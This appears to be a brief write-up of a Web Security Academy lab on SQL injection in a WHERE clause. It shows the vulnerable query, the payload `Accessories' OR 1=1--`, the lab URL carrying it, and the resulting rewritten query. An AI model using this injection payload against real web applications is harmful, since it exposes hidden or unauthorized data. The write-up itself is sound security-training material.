Title: SQL injection vulnerability in WHERE clause allowing retrieval of hidden data

Using filter I have URL like this: `https://0a07001204a3ee6388fedc5b00c9000a.web-security-academy.net/filter?category=Accessories`

I know, that SELECT statement looks like that: 
SELECT * FROM products WHERE category = 'Gifts' AND released = 1
So, I need to inject code: `Accessories' OR 1=1--`

The URL will be like that:
`https://0a07001204a3ee6388fedc5b00c9000a.web-security-academy.net/filter?category=Accessories' OR 1=1--`

and after that SELECT statemtn would look like that:
SELECT * FROM products WHERE category = 'Accessories' OR 1=1--' AND released = 1,

SELECT * FROM products WHERE category = 'Accessories' OR 1=1
